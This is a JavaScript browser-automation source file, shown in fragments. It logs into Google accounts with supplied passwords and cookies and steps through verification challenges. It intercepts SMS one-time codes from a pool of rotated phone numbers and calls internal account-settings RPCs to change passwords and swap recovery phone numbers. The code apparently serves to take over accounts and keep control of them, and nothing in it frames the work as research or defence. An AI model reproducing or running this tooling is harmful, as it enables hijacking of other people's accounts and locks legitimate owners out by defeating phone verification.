...
async function loginWithCompleted(number, password, cookies, time, worker) {
    try {
        ...
        if (index >= 0) {
            cookies = cookies.substring(index+2)
        }
        ...
        if (await isValidCookies(cookies)) {
            ...
            try {
                ...
                if (mRapt) {
                    ...
                    let mLoader = await validRaptoken(browser, page, mData.gmail, password, mRapt)
                    let recoveryNumber = ''
                    ...
                    if (mLoader.change) {
                        ...
                        mRapt = mLoader.rapt
                        if (!mPassword) {
                            mPassword = encrypt(mLoader.pass)
                        }
...
async function validRaptoken(browser, page, user, password, mRapt) {
    let mClose = false
    try {
...
async function waitForGmailLogin(page, user, password, number) {
    try {
        await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com/security', { waitUntil: 'load', timeout: 0 })
        await delay(1000)
        console.log('Process: [ Login: Set User --- Time: '+getTime()+' ]')
        ...
        if (status == 1) {
            ...
            console.log('Process: [ Login: Set Password --- Time: '+getTime()+' ]')
            await delay(500)
            ...
            if (status == 3) {
                if (await exists(page, 'div[data-challengetype="13"]')) {
                    ...
                    if (await waitforLoginNumber(page)) {
                        ...
                        await delay(500)
                        if (await exists(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')) {
                            ...
                            let next = await findView(page, 'button[type="button"]', 'Next')
                            if (next) {
                                await next.click()
                            }
                        }
            ...
            if (status == 9) {
                await delay(1000)
                let text = await findView(page, 'button[type="button"]', 'Text')
                            
                if (text) {
                    let msgs = await readPrevMsgs(number)
                    console.log('Process: [ Login: Send OTP --- Time: '+getTime()+' ]')
                    await text.click()

                    if (await waitForLoginVerify(page)) {
                        let otp = await waitForOtp(number, msgs)

                        if (otp) {
                            console.log('Process: [ Login: Set OTP: '+otp+' --- Time: '+getTime()+' ]')
...
async function passwordChange(page) {
    try {
...
async function waitForRecoveryChange(page, mRapt) {
    try {
            ...
            try {
                ...
                let data = await page.evaluate(async (number, rapt) => {
                    try {
                        ...
                        let body = `f.req=%5B%5B%5B%22dBYu5c%22%2C%22%5B%5C%22%2B${number}%5C%22%2C1%2Cnull%2C3%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=${encodeURIComponent(at)}&`

                        let res = await fetch('/_/AccountSettingsUi/data/batchexecute?rpcids=dBYu5c&source-path=%2Fphone&hl=en&rapt='+rapt+'&soc-app=1&soc-platform=1&soc-device=1&rt=c',
                            {
                                method: 'POST',
                                headers: {
                ...
                if (details && details.id && details.token) {
                    ...
                    if (otp) {
                        await page.evaluate(async (number, id, token, otp, rapt) => {
                            try {
                                let at = window.WIZ_global_data?.SNlM0e

                                let body = 'f.req=%5B%5B%5B%22ly4LJd%22%2C%22%5B%5C%22'+encodeURIComponent(token)+'%5C%22%2C%5C%22'+otp+'%5C%22%2C1%2C3%2C1%2Cnull%2C1%2C%5C%22'+id+'%5C%22%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=' + encodeURIComponent(at) + '&'
                                
                                await fetch('/_/AccountSettingsUi/data/batchexecute?rpcids=ly4LJd&source-path=%2Fphone&hl=en&rapt='+rapt+'&soc-app=1&soc-platform=1&soc-device=1&rt=c',
                                    {
                                        method: 'POST',
                                        headers: {
                                            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                ...
                                body = 'f.req=%5B%5B%5B%22ZBoWob%22%2C%22%5B%5B1%2Cnull%2C%5C%22%2B'+number+'%5C%22%2C%5C%22%2B'+number+'%5C%22%2C%5B1%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=' + encodeURIComponent(at) + '&'
                                
                                await fetch('/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&source-path=%2Fphone&hl=en&rapt='+rapt+'&soc-app=1&soc-platform=1&soc-device=1&rt=c',
                                    {
                                        method: 'POST',
                                        headers: {
                                            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8'
                        ...
                        }, number, details.id, details.token, otp, mRapt)

                        return number
                    } else {
                        console.log('Process: [ Recovery Add: OTP Failed --- Time: '+getTime()+' ]')
                    }
                } else {
...
async function waitForLoginSuccess(page, again) {
    let status = 0
    ...
    for (let load = 0; load < 30; load++) {
        try {
            ...
            if (pageUrl.startsWith('https://gds.google.com/web') || pageUrl.startsWith('https://gds.google.com/web/recoveryoptions')) {
                status = 1
                break
                ...
                status = 7
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/totp') && (!(again && again == '2FA'))) {
                status = 8
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
                status = 9
                break
                ...
                await delay(3000)
            } else if (!again && (pageUrl.startsWith('https://accounts.google.com/signin/v2/speedbump/changepassword/changepasswordform') || pageUrl.startsWith('https://accounts.google.com/v3/signin/speedbump/changepassword/changepasswordform'))) {
                status = 11
                break
            }
        } catch (error) {}
...
async function waitforLoginNumber(page) {
    
    for (let load = 0; load < 30; load++) {
        try {
            let pageUrl = await page.evaluate(() => window.location.href)
            
            if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/kpp')) {
                if (await exists(page, 'input#phoneNumberId')) {
                    return true
                }
            }
...
async function waitForLoginVerify(page) {
    
    for (let load = 0; load < 30; load++) {
        try {
            let pageUrl = await page.evaluate(() => window.location.href)
            
            if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/verify')) {
                if (await exists(page, 'input#idvPin')) {
                    return true
                }
            }
        } catch (error) {}
...
async function waitForOtp(number, prevMsgs = []) {
    for (let i = 0; i < 20; i++) {
        try {
            let latestMsgs = await readLetestMsgs(number, prevMsgs)
            
            if (latestMsgs) {
                for (let msg of latestMsgs) {
                    let body = msg.Messagebody || ''

                    if (body.includes('Google verification code')) {
                        let match = body.match(/G-(\d{6})/i)
...
async function readLetestMsgs(number, prevMsgs = []) {
    try {
        ...
        let currentMsgs = response.data.messages || []
        
        let prevSet = new Set( prevMsgs.map(m => `${m.FromNumber}|${m.Messagebody}` ))

        let latestMsgs = currentMsgs.filter(m => !prevSet.has(`${m.FromNumber}|${m.Messagebody}`))
...
function numberAddToken(data) {
    try {
        if (data) {
            let json = JSON.parse(data[0][2])
            return { id: json[4], token: json[1] }
        }
    } catch (error) {}
...
function pickRandomNumber(list, mRanking) {
    let now = Date.now()
    ...
    let weightedList = list.map(item => {
        ...
        weight += (10 - item.page) * 10

        let rank = mRanking[item.number]

        if (rank) {
            if (rank.error === 0) weight += 30
            else weight -= 20

            let diff = now - rank.used

            if (diff < TEN_MIN_MS) {
                weight += 2
            } else {
                let capped = Math.min(diff, SIX_HOUR_MS)
                let ratio = capped / SIX_HOUR_MS
                weight += ratio * 60
            }
        } else {
            weight += 25
    ...
    let positive = weightedList.filter(i => i.weight > 0)

    if (positive.length > 0) {
        let total = positive.reduce((s, i) => s + i.weight, 0)
        let r = Math.random() * total

        for (let item of positive) {
            r -= item.weight
            if (r <= 0) return item.number
        }
    }

    let minWeight = Math.min(...weightedList.map(i => i.weight))
    let lowest = weightedList.filter(i => i.weight === minWeight)

    return lowest[Math.floor(Math.random() * lowest.length)].number
}
